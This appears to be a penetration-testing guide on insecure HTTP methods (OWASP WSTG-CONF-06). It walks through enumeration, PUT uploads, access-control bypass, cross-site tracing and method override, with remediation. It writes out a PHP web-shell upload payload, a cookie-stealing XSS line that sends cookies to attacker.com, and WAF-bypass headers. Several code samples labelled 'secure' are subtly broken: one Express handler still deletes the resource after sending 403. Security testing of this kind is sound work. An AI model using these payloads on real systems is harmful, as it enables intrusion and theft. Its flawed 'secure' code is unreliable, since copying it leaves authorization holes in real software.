# Testing Insecure HTTP Methods

## Overview

Testing HTTP methods involves enumerating the HTTP methods supported by a web server and verifying that only necessary methods are enabled to prevent security risks. According to OWASP (WSTG-CONF-06), misconfigured HTTP methods can allow attackers to perform unauthorized actions, such as uploading malicious files (via PUT), bypassing authentication, or exploiting Cross-Site Tracing (XST) to steal sensitive data like cookies. This guide provides a comprehensive methodology to test HTTP methods, covering discovery, file upload attempts, access control bypass, XST, method overriding, advanced proxy and API scenarios, and authentication context testing, with tools, commands, payloads, and remediation strategies.

**Impact**: Insecure HTTP method configurations can lead to:
- Unauthorized file uploads or modifications (e.g., via PUT, DELETE).
- Authentication bypass or access to restricted resources.
- Exposure of sensitive data (e.g., cookies via TRACE).
- Remote code execution (RCE) if WebDAV methods are enabled.
- Non-compliance with security standards (e.g., PCI DSS, GSSOC-4).

This guide aligns with OWASP’s WSTG-CONF-06, offering black-box and gray-box testing steps, beginner-friendly tool setups, specific commands, and ethical considerations. Advanced test cases address modern application stacks with load balancers, Web Application Firewalls (WAFs), and API gateways. 

**Ethical Note**: Obtain explicit permission before testing, as probing HTTP methods may trigger security alerts, modify server content, or disrupt application functionality, potentially causing significant harm.

## Testing Tools

The following tools are recommended for testing HTTP methods, with setup instructions optimized for new pentesters:

- **Nmap**: Network discovery tool with HTTP method scanning capabilities.
  - Install on Linux:
    ```bash
    sudo apt install nmap
    ```
  - Install on Windows/Mac: Download from [Nmap](https://nmap.org/download.html).
  - Example:
    ```bash
    nmap -p 80 --script http-methods example.com
    ```

- **Ncat**: Command-line tool for sending raw HTTP requests.
  - Install on Linux:
    ```bash
    sudo apt install ncat
    ```
  - Install on Windows/Mac: Included with Nmap.
  - Example:
    ```bash
    echo -e "OPTIONS / HTTP/1.1\nHost: example.com\n\n" | ncat example.com 80
    ```

- **Burp Suite Community Edition**: Web application security testing suite.
  - Download from [PortSwigger](https://portswigger.net/burp/communitydownload).
  - Configure browser proxy: `127.0.0.1:8080`.
  - Use Repeater to test methods and Intruder for fuzzing.

- **OWASP ZAP 3.2**: Open-source web application security scanner.
  - Download from [ZAP](https://www.zaproxy.org/download/).
  - Configure browser proxy: `127.0.0.1:8080`.
  - Enable HUD:
    1. Go to Tools > Options > HUD.
    2. Enable HUD for in-browser testing.
  - Use Active Scan with HTTP method rules.

- **w3af**: Web application attack and audit framework.
  - Install on Linux:
    ```bash
    sudo apt install w3af
    ```
  - Example:
    ```bash
    w3af_console -s http-methods.py
    ```

- **cURL**: Command-line tool for sending HTTP requests.
  - Install on Linux:
    ```bash
    sudo apt install curl
    ```
  - Example:
    ```bash
    curl -X OPTIONS http://example.com
    ```

- **AWS CLI**: Tool for interacting with AWS API Gateway and ALB.
  - Install:
    ```bash
    pip install awscli
    ```
  - Configure:
    ```bash
    aws configure
    ```
  - Example:
    ```bash
    aws apigateway test-invoke-method --rest-api-id <api-id> --resource-id <resource-id> --http-method PUT
    ```

## Testing Methodology

This methodology follows OWASP’s black-box and gray-box approaches for WSTG-CONF-06, testing HTTP method vulnerabilities through enumeration, file upload attempts, access control checks, XST exploitation, method overriding, advanced proxy/API testing, and authentication context analysis. Each test includes a **Detection/Exploitation** label to distinguish discovery from impact.

### Common HTTP Methods and Payloads

Below is a list of common HTTP methods and payloads to test for vulnerabilities. Start with discovery and escalate based on server responses. Use with caution in controlled environments to avoid unintended modifications.

- **Common HTTP Methods**:
  - `GET`: Retrieve resources.
  - `POST`: Submit data.
  - `HEAD`: Retrieve headers.
  - `OPTIONS`: List supported methods.
  - `PUT`: Upload files.
  - `DELETE`: Remove resources.
  - `TRACE`: Echo request (potential XST).
  - `CONNECT`: Proxy tunneling.

- **Discovery Payloads**:
  - `OPTIONS / HTTP/1.1`
  - `GET / HTTP/1.1` (baseline)

- **PUT Method Payloads**:
  - `PUT /test.html HTTP/1.1` with body: `<html>Test</html>`
  - `PUT /malicious.php HTTP/1.1` with body: `<?php system($_GET['cmd']); ?>`

- **Access Control Bypass Payloads**:
  - `HEAD /admin HTTP/1.1`
  - `DELETE /admin HTTP/1.1`

- **XST Payloads**:
  - `TRACE / HTTP/1.1` with `Random: Header`
  - `TRACE / HTTP/1.1` with `Attack: <script>alert('XST')</script>`

- **Method Override Payloads**:
  - `POST /resource HTTP/1.1` with `X-HTTP-Method-Override: DELETE`
  - `POST /resource HTTP/1.1` with `X-Forwarded-Method: DELETE`

- **API Gateway Payloads**:
  - `PUT /api/v1/resource HTTP/1.1` with `Authorization: Bearer <token>`
  - `POST /api/v1/resource HTTP/1.1` with `X-Method: DELETE`

**Note**: Method behavior depends on the server (e.g., Apache, Nginx), application framework, and infrastructure (e.g., Cloudflare, AWS API Gateway). Test methods on critical endpoints (e.g., `/admin`, `/api`) to maximize impact.

### 1. Discover Supported HTTP Methods

**Objective**: Enumerate HTTP methods supported by the web server.

**Detection/Exploitation**: Discovery only

**Steps**:
1. Use Nmap:
   - Run:
     ```bash
     nmap -p 80,443 --script http-methods --script-args http-methods.url-path='/index.php' example.com
     ```
   - Check for: `GET`, `POST`, `OPTIONS`, `HEAD`.
2. Use cURL:
   - Run:
     ```bash
     curl -X OPTIONS http://example.com
     ```
   - Look for `Allow` header: `Allow: GET, POST, HEAD`.
3. Use Burp Suite:
   - Send `OPTIONS` request in Repeater.
   - Verify supported methods.
4. Check for unsafe methods:
   - Look for: `PUT`, `DELETE`, `TRACE`.

**Example Vulnerable Response**:
```text
Allow: GET, POST, PUT, DELETE, OPTIONS, HEAD, TRACE
```
Result: Unsafe methods enabled.

**Example Secure Response**:
```text
Allow: GET, POST, HEAD
```
Result: Only necessary methods enabled.

**Remediation**:
- Disable unsafe methods (Apache):
  ```apache
  <LimitExcept GET POST HEAD>
      Require all denied
  </LimitExcept>
  ```
- Disable in Nginx:
  ```nginx
  if ($request_method !~ ^(GET|POST|HEAD)$) {
      return 405;
  }
  ```

**Tip**: Save supported methods in a report.

### 2. Testing the PUT Method

**Objective**: Test if the server allows unauthorized file uploads via PUT.

**Detection/Exploitation**: Exploitable, Proof of Concept provided

**Steps**:
1. Send PUT request with Burp Suite:
   - Request:
     ```http
     PUT /test.html HTTP/1.1
     Host: example.com
     Content-Length: 28

     <html>HTTP PUT Enabled</html>
     ```
   - Check for: `HTTP/1.1 200 OK` or `201 Created`.
2. Verify file access:
   - Use:
     ```bash
     curl http://example.com/test.html
     ```
   - Look for: `<html>HTTP PUT Enabled</html>`.
3. Test malicious file:
   - Try: `PUT /malicious.php` with `<?php system($_GET['cmd']); ?>`.
4. Use Ncat:
   - Run:
     ```bash
     echo -e "PUT /test.html HTTP/1.1\nHost: example.com\nContent-Length: 28\n\n<html>Test</html>" | ncat example.com 80
     ```

**Example Vulnerable Code (Apache)**:
```apache
<Directory "/var/www/html">
    AllowOverride All
    Require all granted
</Directory>
```
Test: `PUT /test.html`
Result: File uploaded.

**Example Secure Code (Apache)**:
```apache
<Directory "/var/www/html">
    <Limit PUT DELETE>
        Require all denied
    </Limit>
</Directory>
```
Test: `HTTP/1.1 405 Method Not Allowed`.

**Remediation**:
- Disable PUT:
  ```nginx
  limit_except GET POST HEAD {
      deny all;
  }
  ```
- Restrict write permissions:
  ```bash
  chmod 644 /var/www/html/*
  ```

**Tip**: Save PUT test evidence in a report.

### 3. Testing for Access Control Bypass

**Objective**: Test if unsupported HTTP methods bypass access controls.

**Detection/Exploitation**: Exploitable, Proof of Concept provided

**Steps**:
1. Access restricted page:
   - Try: `http://example.com/admin` (expect redirect to `/login`).
2. Test alternative methods with Ncat:
   - Request:
     ```bash
     echo -e "HEAD /admin HTTP/1.1\nHost: example.com\n\n" | ncat example.com 80
     ```
   - Check for: `HTTP/1.1 200 OK` (vulnerable) vs. `302 Found`.
3. Use Burp Suite:
   - Send `HEAD`, `DELETE`, `PUT` to `/admin`.
   - Verify response codes.
4. Test other endpoints:
   - Try: `/api/admin`, `/dashboard`.

**Example Vulnerable Code (Node.js)**:
```javascript
app.get('/admin', (req, res) => {
    if (!req.session.auth) res.redirect('/login');
});
```
Test: `HEAD /admin`
Result: `HTTP/1.1 200 OK`.

**Example Secure Code (Node.js)**:
```javascript
app.use('/admin', (req, res, next) => {
    if (!req.session.auth) res.redirect('/login');
    next();
});
```
Test: `HTTP/1.1 302 Found`.

**Remediation**:
- Enforce method checks:
  ```javascript
  if (!['GET', 'POST'].includes(req.method)) res.status(405).send();
  ```
- Use middleware:
  ```nginx
  location /admin {
      limit_except GET POST {
          deny all;
      }
  }
  ```

**Tip**: Save bypass evidence in a report.

### 4. Testing for Cross-Site Tracing (XST)

**Objective**: Test if the TRACE method is enabled, exposing sensitive data.

**Detection/Exploitation**: Exploitable, Proof of Concept provided

**Steps**:
1. Send TRACE request with Ncat:
   - Request:
     ```bash
     echo -e "TRACE / HTTP/1.1\nHost: example.com\nRandom: Header\n\n" | ncat example.com 80
     ```
   - Check for: `Random: Header` in response.
2. Test XST with script:
   - Request:
     ```bash
     echo -e "TRACE / HTTP/1.1\nHost: example.com\nAttack: <script>alert('XST')</script>\n\n" | ncat example.com 80
     ```
   - Look for: `<script>alert('XST')</script>`.
3. Use Burp Suite:
   - Send `TRACE` in Repeater.
   - Verify reflected headers.
4. Check cookies:
   - Include: `Cookie: session=abc123`.

**Example Vulnerable Response**:
```http
HTTP/1.1 200 OK
TRACE / HTTP/1.1
Host: example.com
Random: Header
```
Result: Headers reflected.

**Example Secure Response**:
```http
HTTP/1.1 405 Method Not Allowed
```
Result: TRACE disabled.

**Remediation**:
- Disable TRACE (Apache):
  ```apache
  TraceEnable Off
  ```
- Disable in Nginx:
  ```nginx
  if ($request_method = TRACE) {
      return 405;
  }
  ```

**Tip**: Save XST evidence in a report.

### 5. Testing for HTTP Method Overriding

**Objective**: Test if the server allows method overriding via headers.

**Detection/Exploitation**: Exploitable, Proof of Concept provided

**Steps**:
1. Test DELETE method:
   - Use:
     ```bash
     echo -e "DELETE /resource HTTP/1.1\nHost: example.com\n\n" | ncat example.com 80
     ```
   - Expect: `HTTP/1.1 405 Method Not Allowed`.
2. Test override with header:
   - Request:
     ```bash
     echo -e "POST /resource HTTP/1.1\nHost: example.com\nX-HTTP-Method-Override: DELETE\n\n" | ncat example.com 80
     ```
   - Check for: `HTTP/1.1 200 OK` (vulnerable).
3. Use Burp Suite:
   - Add `X-HTTP-Method-Override: DELETE` to `POST`.
   - Verify response.
4. Test other headers:
   - Try: `X-Method-Override`, `X-HTTP-Method`.

**Example Vulnerable Code (Python)**:
```python
method = request.headers.get('X-HTTP-Method-Override', request.method)
if method == 'DELETE':
    delete_resource()
```
Test: `POST` with `X-HTTP-Method-Override: DELETE`
Result: Resource deleted.

**Example Secure Code (Python)**:
```python
if request.method != 'DELETE':
    return Response(status=405)
delete_resource()
```
Test: Ignores override header.

**Remediation**:
- Ignore override headers:
  ```python
  if 'X-HTTP-Method-Override' in request.headers:
      return Response(status=400)
  ```
- Restrict methods:
  ```nginx
  limit_except GET POST {
      deny all;
  }
  ```

**Tip**: Save override evidence in a report.

### 6. Testing Behind Reverse Proxies and API Gateways

**Objective**: Test HTTP method behavior behind reverse proxies (e.g., Cloudflare, AWS ALB) and API gateways (e.g., AWS API Gateway, Apigee).

**Detection/Exploitation**: Discovery and Exploitable, Proof of Concept provided

**Steps**:
1. Identify proxy/gateway:
   - Use cURL to check headers:
     ```bash
     curl -I http://example.com
     ```
   - Look for: `Server: Cloudflare`, `Via: aws_alb`.
2. Test Cloudflare WAF bypass:
   - Send:
     ```bash
     curl -X PUT http://example.com/test.html -H "X-Forwarded-Method: PUT"
     ```
   - Check for: `HTTP/1.1 200 OK` (vulnerable).
3. Test AWS API Gateway:
   - Use AWS CLI:
     ```bash
     aws apigateway test-invoke-method --rest-api-id <api-id> --resource-id <resource-id> --http-method DELETE
     ```
   - Verify if `DELETE` is processed despite restrictions.
4. Test custom headers:
   - Try: `X-Forwarded-Method: DELETE`, `X-Method: PUT`.
   - Use Burp Suite to inject headers.
5. Test REST API endpoints:
   - Send:
     ```http
     PUT /api/v1/resource HTTP/1.1
     Host: api.example.com
     X-Method: DELETE
     ```
   - Check for unexpected method execution.

**Example Vulnerable Configuration (AWS API Gateway)**:
```json
{
  "httpMethod": "ANY",
  "authorizationType": "NONE"
}
```
Test: `PUT /api/v1/resource`
Result: Processed despite restrictions.

**Example Secure Configuration (AWS API Gateway)**:
```json
{
  "httpMethod": ["GET", "POST"],
  "authorizationType": "AWS_IAM"
}
```
Test: `HTTP/1.1 403 Forbidden`.

**Remediation**:
- Configure WAF rules (Cloudflare):
  ```text
  Block requests with X-Forwarded-Method
  ```
- Restrict API Gateway methods:
  ```bash
  aws apigateway update-method --rest-api-id <api-id> --resource-id <resource-id> --http-method DELETE --authorization-type AWS_IAM
  ```
- Validate headers:
  ```python
  if 'X-Forwarded-Method' in request.headers:
      return Response(status=400)
  ```

**Tip**: Save proxy/gateway test evidence in a report.

### 7. Testing Authentication and Session Context

**Objective**: Test HTTP method restrictions based on authentication and session context.

**Detection/Exploitation**: Exploitable, Proof of Concept provided

**Steps**:
1. Gray-box: Authenticated vs. unauthenticated:
   - Unauthenticated:
     ```bash
     curl -X DELETE http://example.com/resource
     ```
   - Authenticated:
     ```bash
     curl -X DELETE http://example.com/resource -H "Cookie: session=abc123"
     ```
   - Check for: `HTTP/1.1 403 Forbidden` (unauthenticated) vs. `200 OK` (authenticated).
2. Session hijacking chain:
   - Steal session cookie via XSS:
     ```javascript
     document.location='http://attacker.com?cookie='+document.cookie;
     ```
   - Use stolen cookie:
     ```bash
     curl -X PUT http://example.com/test.html -H "Cookie: session=abc123"
     ```
   - Verify file upload.
3. Cookie exposure in TRACE:
   - Send:
     ```bash
     echo -e "TRACE / HTTP/1.1\nHost: example.com\nCookie: session=abc123\n\n" | ncat example.com 80
     ```
   - Check for: `Cookie: session=abc123` in response.
4. Method override with session:
   - Test:
     ```bash
     curl -X POST http://example.com/resource -H "Cookie: session=abc123" -H "X-HTTP-Method-Override: DELETE"
     ```

**Example Vulnerable Code (Express)**:
```javascript
app.delete('/resource', (req, res) => {
    if (req.session.user) deleteResource();
});
```
Test: `DELETE` with stolen cookie
Result: Resource deleted.

**Example Secure Code (Express)**:
```javascript
app.delete('/resource', (req, res) => {
    if (!req.session.user || !req.session.isAdmin) res.status(403).send();
    deleteResource();
});
```
Test: `HTTP/1.1 403 Forbidden`.

**Remediation**:
- Enforce session validation:
  ```javascript
  if (!req.session.isAuthenticated) res.status(403).send();
  ```
- Secure cookies:
  ```javascript
  app.use(session({ httpOnly: true, secure: true }));
  ```
- Rate-limit sensitive methods:
  ```nginx
  limit_req_zone $binary_remote_addr zone=admin:10m rate=5r/s;
  location /admin {
      limit_req zone=admin;
  }
  ```

**Tip**: Save authentication test evidence in a report.